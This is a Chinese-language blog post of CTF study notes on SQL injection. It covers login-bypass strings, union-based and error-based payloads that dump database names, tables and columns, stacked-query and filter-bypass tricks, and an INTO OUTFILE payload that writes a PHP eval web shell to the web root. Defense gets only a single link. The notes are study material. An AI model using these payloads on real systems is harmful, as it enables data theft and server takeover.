
<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="UTF-8" />
        <title>sql注入 | 雲流のLowest World</title>
        <meta name="author" content="C1oudfL0w0" />
        <meta name="description" content="" />
        <meta name="keywords" content="" />
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
        <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
        <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script>
<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<script> const mixins = {}; </script>

<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>




<script src="/blog/js/lib/preview.js"></script>









<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />

        <!-- 引入jQuery-->
        <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
        <!-- 页面点击小红心与文字 -->
        <script type = "text/javascript" src = "/blog/js/love-click.js"></script>
        <!-- 浏览器标题 -->
        <script type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
        
        
        <script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
        <!-- 代码语言 -->
        <script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
        <!-- 代码块复制 -->
        <script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
        <script type="text/javascript" src="/blog/libs/codeBlock/clipboard.min.js"></script>
        <!-- 代码块收缩 -->
        <script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
        <!-- 代码块折行 -->
        <style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>

    <meta name="generator" content="Hexo 6.3.0"></head>
    <body>
        <!--flag{never_g0nna g1ve_you up}-->

        <!--动态背景-->
        <script type="text/javascript"
        color="0,0,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

        <!--文章目录-->
        <div id="toc" class="toc-article" style="position: absolute; top: 40px; z-index: 2;">
    <div class="toc-title"></div>
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E8%AF%AD%E6%B3%95"><span class="toc-text">SQL语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-text">万能密码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-text">注入位置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95"><span class="toc-text">注入手法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">布尔盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%8D%E6%95%B0%E9%95%BF%E5%BA%A6%E4%B8%8D%E8%B6%B3"><span class="toc-text">位数长度不足</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4"><span class="toc-text">输入过滤</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-text">防御</span></a></li></ol>
</div>
        
        <!--返回顶部-->
        <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
            <a title="返回顶部">↑</a>
            </div>
        <script src="/blog/js/totop.js"></script>

        <div id="layout">
            <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载可能会花费较长时间，请耐心等待</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
            </transition>
            <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>sql注入</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/16
        </span>
        
        <span class="category">
            <a href="/blog/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        
        <span class="tags">
            <span class="icon">
                <i class="fa-solid fa-tags fa-fw"></i>
            </span>
            
            <span class="tag">
                
                <a href="/blog/tags/Sql/" style="color: #00a596">Sql</a>
            </span>
            
        </span>
        
    </div>
    
    <div class="content" v-pre>
        <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">SQL注入</a></h1><p><a target="_blank" rel="noopener" href="http://sqlwiki.radare.cn/#/injectionTypes/errorBased">wiki</a></p>
<p>原型</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">//拼接sql语句查找指定ID用户</span>
$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from table_name where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>PS:此语句中存在<code>limit 1</code>即只回显一行</p>
<p>基本思路</p>
<p>用<code>1&#39;</code>闭合前面的语句，执行自己构造的语句</p>
<span id="more"></span>

<h2 id="SQL语法"><a href="#SQL语法" class="headerlink" title="SQL语法"></a><a href="https://c1oudfl0w0.github.io/blog/2023/05/05/SQL%E8%AF%AD%E6%B3%95/">SQL语法</a></h2><ul>
<li><p><strong>表示注释</strong>:</p>
<p>#或%23：post请求中使用</p>
<p>–+或–%20:get请求中使用（+将被识别为空格）</p>
</li>
</ul>
<hr>
<h2 id="万能密码绕过"><a href="#万能密码绕过" class="headerlink" title="万能密码绕过"></a>万能密码绕过</h2><p>原理：使相关语句永真，使整段语句可执行即可，然后会返回所有结果</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'or 1 = 1#
1'</span><span class="token operator">or</span><span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1
1'</span><span class="token operator">or</span><span class="token string">'1'</span><span class="token operator">=</span><span class="token string">'1'</span><span class="token operator">%</span><span class="token number">23</span>

此时
<span class="token keyword">select</span> username<span class="token punctuation">,</span>password <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">!=</span><span class="token string">'flag'</span> <span class="token operator">and</span> id <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token operator">and</span>优先级<span class="token operator">></span><span class="token operator">or</span>
即username <span class="token operator">!=</span><span class="token string">'flag'</span> <span class="token operator">and</span> id <span class="token operator">=</span> <span class="token string">'1'</span> 或 <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span>
F <span class="token operator">or</span> T <span class="token operator">=</span> T<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>ffifdyop</code>：md5加密时使用&#x3D;<code>129581926211651571912466741651878684928</code></p>
<h2 id="注入位置"><a href="#注入位置" class="headerlink" title="注入位置"></a>注入位置</h2><h2 id="注入手法"><a href="#注入手法" class="headerlink" title="注入手法"></a>注入手法</h2><ul>
<li><p>数字型：当输入的参数为整型时，如果存在注入漏洞，可以认为是数字型注入（无引号闭合）</p>
<p><code>1</code></p>
</li>
<li><p>字符型：当输入的参数被当做字符串时，称为字符型（有引号闭合）</p>
<p><code>1‘</code>或<code>1“</code></p>
<hr>
</li>
</ul>
<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><blockquote>
<p>适用于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化</p>
</blockquote>
<blockquote>
<p>并集查询，可用于前面的语句查不到的情况</p>
</blockquote>
<p>语句原型</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">select</span> column_name<span class="token punctuation">,</span>column_name <span class="token keyword">from</span> table_name <span class="token keyword">where</span> column_name<span class="token operator">=</span><span class="token string">'flag'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>



<ul>
<li><p>步骤</p>
<p><em>1. 页面观察</em></p>
<p><em>2. 注入点判断</em></p>
<p><em>3. 判断当前表的字段个数</em>：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">3</span> <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><em>4. 判断显示位</em>：判断我们的输入会在屏幕哪个地方进行回显</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,3 --+
//=-1'</span>:<span class="token punctuation">(</span>让前面的参数查不出来<span class="token punctuation">)</span>
<span class="token comment">//1,2,3:(总列数)</span>
<span class="token comment">//--+(注释)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><em>5. 爆数据库名字</em></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token comment">--+</span>
<span class="token comment">//1:(头列数)</span>
<span class="token comment">//3:(尾列数)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><em>6. 爆数据库中的表</em></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()/'</span>数据库名' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><em>7. 爆表中的字段</em></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(column_name),3 from information_schema.columns where (table_schema='</span>数据库名<span class="token string">' and)  table_name='</span>表名' <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><em>8. 爆相应字段的所有数据</em></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,group_concat(字段名,'</span><span class="token comment">--',字段名,'--',字段名),3 from 表名 --+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
</ul>
<hr>
<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/123486880?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167946953016800188553547%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167946953016800188553547&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123486880-null-null.142%5Ev76%5Einsert_down1,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8&spm=1018.2226.3001.4187">布尔盲注</a></h2><blockquote>
<p>页面只有登录成功和登录失败这两种情况时，可以使用布尔盲注。</p>
</blockquote>
<hr>
<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><ul>
<li><p><strong>group by 重复键冲</strong></p>
<p><code>?id=-1&#39; and (select 1 from (select count(*),concat((select 查询的内容 from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+ </code></p>
</li>
<li><p><strong>extractvalue(目标xml文档，xml路径)函数</strong></p>
<p>对XML文档进行查询的函数，从目标XML中返回包含所查询值的字符串</p>
<p><code>?id=-1&#39; and extractvalue(1,concat(&#39;^&#39;,(select (不要加列数) database()),&#39;^&#39;)) --+</code></p>
</li>
<li><p><strong>updatexml() 函数</strong></p>
<p>原理：updatexml()函数实际上是去更新了XML文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就			因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码</p>
<p>作用: 改变文档中符合条件的节点的值</p>
<p><code>?id=-1&#39; and updatexml(1,concat(&#39;^&#39;,(需要查询的内容),&#39;^&#39;),1) --+</code></p>
</li>
</ul>
<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><ul>
<li><p>使用<code>;</code>执行多条sql语句</p>
</li>
<li><p><strong>区别</strong>：联合查询注入只能执行查询语句，堆叠注入可执行任意语句</p>
</li>
<li><p><strong>rename…to…语句</strong>:可以重命名改表名，使表名可被直接查询到</p>
</li>
<li><p><strong>alter</strong>：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）</p>
<ul>
<li><p>添加：</p>
<p><code>alter table &quot; table_name&quot; add &quot; column_name&quot;  type;</code></p>
</li>
<li><p>删除：</p>
<p><code>alter table &quot; table_name&quot; drop &quot; column_name&quot;  type;</code></p>
</li>
<li><p>改变数据类型：</p>
<p><code>alter table &quot; table_name&quot; alter column &quot; column_name&quot; type;</code></p>
</li>
<li><p>改列名：</p>
<p><code>alter table &quot;table_name&quot; rename &quot;column1&quot; to &quot;column2&quot;;</code></p>
</li>
</ul>
</li>
<li><p><strong>编码</strong>(以select * from `1919810931114514`为例)</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token punctuation">;</span><span class="token keyword">SeT</span><span class="token variable">@a</span><span class="token operator">=</span><span class="token number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span><span class="token punctuation">;</span><span class="token keyword">prepare</span> execsql <span class="token keyword">from</span> <span class="token variable">@a</span><span class="token punctuation">;</span><span class="token keyword">execute</span> execsql<span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li>prepare…from…是预处理语句，会进行编码转换</li>
<li>execute用来执行由SQLPrepare创建的SQL语句</li>
<li>SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值</li>
</ul>
</li>
</ul>
<hr>
<h2 id="限制绕过"><a href="#限制绕过" class="headerlink" title="限制绕过"></a>限制绕过</h2><h3 id="位数长度不足"><a href="#位数长度不足" class="headerlink" title="位数长度不足"></a>位数长度不足</h3><p>使用截断函数</p>
<ul>
<li><strong>substr()函数</strong></li>
</ul>
<p>​	  <code>substr(string,start,length)</code><img src="/blog/sql%E6%B3%A8%E5%85%A5/image-20221207161642898.png" alt="1"></p>
<ul>
<li><p><strong>left()函数</strong></p>
<p>获得源字符串左边的子串</p>
<p><code>left(string,n)</code></p>
</li>
<li><p><strong>right()函数</strong></p>
<p>获得字符串右边的子串</p>
<p><code>right(string,n)</code></p>
</li>
<li><p><strong>mid()函数</strong></p>
<p>返回字符串的子串</p>
<p><code>mid(string,start,length)</code></p>
</li>
<li><p><strong>reverse()函数</strong></p>
</li>
</ul>
<hr>
<h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><ol>
<li><p>空格：<code>/**/</code>、<code>%09</code>、<code>%0a</code>、<code>%0d</code>、<code>%0c</code>、<code>+</code></p>
<p>以上全部过滤：<code>-1&#39;||column_name=&#39;flag</code>或<code>-1&#39;or(username)=&#39;flag</code></p>
</li>
<li><p>等号：like</p>
</li>
<li><p>单独select: 大写</p>
</li>
<li><p>select…where…：</p>
<ul>
<li><p>show + datebases &#x2F; tables &#x2F; columns from table </p>
</li>
<li><p>将 select * from 列名 进行16进制编码</p>
</li>
<li><p><strong>handler</strong>:一行一行显示库中内容</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">handler</span> tablename <span class="token keyword">open</span> <span class="token keyword">as</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span>为新创建的表<span class="token punctuation">)</span>
<span class="token keyword">handler</span> tablename <span class="token keyword">read</span><span class="token punctuation">;</span>读出什么输出什么

<span class="token keyword">handler</span> tablename <span class="token keyword">read</span> <span class="token keyword">first</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">handler</span> <span class="token identifier"><span class="token punctuation">`</span>a<span class="token punctuation">`</span></span> <span class="token keyword">read</span> <span class="token keyword">next</span> <span class="token punctuation">[</span><span class="token keyword">where</span> username<span class="token operator">=</span>‘admin’<span class="token punctuation">]</span><span class="token punctuation">;</span> – <span class="token punctuation">[</span><span class="token punctuation">]</span> 中的内容意味着可加可不加<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
</li>
</ol>
<p>单字段过滤：</p>
<p>16进制编码<code>hex(a.username)</code></p>
<p>过滤数字：</p>
<p>用别的字符替换数字然后再转换回去</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),'</span><span class="token number">1</span><span class="token string">','</span>arc<span class="token string">'),'</span><span class="token number">2</span><span class="token string">','</span>brc<span class="token string">'),'</span><span class="token number">3</span><span class="token string">','</span>crc<span class="token string">'),'</span><span class="token number">4</span><span class="token string">','</span>drc<span class="token string">'),'</span><span class="token number">5</span><span class="token string">','</span>erc<span class="token string">'),'</span><span class="token number">6</span><span class="token string">','</span>frc<span class="token string">'),'</span><span class="token number">7</span><span class="token string">','</span>grc<span class="token string">'),'</span><span class="token number">8</span><span class="token string">','</span>hrc<span class="token string">'),'</span><span class="token number">9</span><span class="token string">','</span>irc<span class="token string">'),'</span><span class="token number">0</span><span class="token string">','</span>jrc<span class="token string">'),'</span>a<span class="token string">' from table_name where username='</span>flag'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>解密脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">flag<span class="token operator">=</span><span class="token string">'flag'</span>
<span class="token comment">#flag表示number</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'arc'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'brc'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'crc'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'drc'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'erc'</span><span class="token punctuation">,</span><span class="token string">'5'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'frc'</span><span class="token punctuation">,</span><span class="token string">'6'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'grc'</span><span class="token punctuation">,</span><span class="token string">'7'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'hrc'</span><span class="token punctuation">,</span><span class="token string">'8'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'irc'</span><span class="token punctuation">,</span><span class="token string">'9'</span><span class="token punctuation">)</span>
flag<span class="token operator">=</span>flag<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'jrc'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<p>过滤ASCll码<code>/[\x00-\x7f]/i</code>：</p>
<p>文件包含</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token string">' union select 1,group_concat(password) from table_name into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>txt<span class="token string">'-- -
将flag写入1.txt文件中

-1'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"&lt;?php eval($_POST[1]);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span>'<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">1.</span>php
写入一句话木马<span class="token punctuation">(</span>需用base64编码<span class="token operator">+</span>from_base64<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
在<span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>api<span class="token operator">/</span>config<span class="token punctuation">.</span>php找到mysql的root的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>






<hr>
<h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><p><a target="_blank" rel="noopener" href="https://www.runoob.com/php/php-mysql-prepared-statements.html">MySQL预处理</a></p>

    </div>
    
    
    
    
    
    
    
</div>

                <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2023 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

            </div>
            </transition>
            
            <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
            </transition>
            
        </div>
        <script src="/blog/js/main.js"></script>
        
        




         
    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>

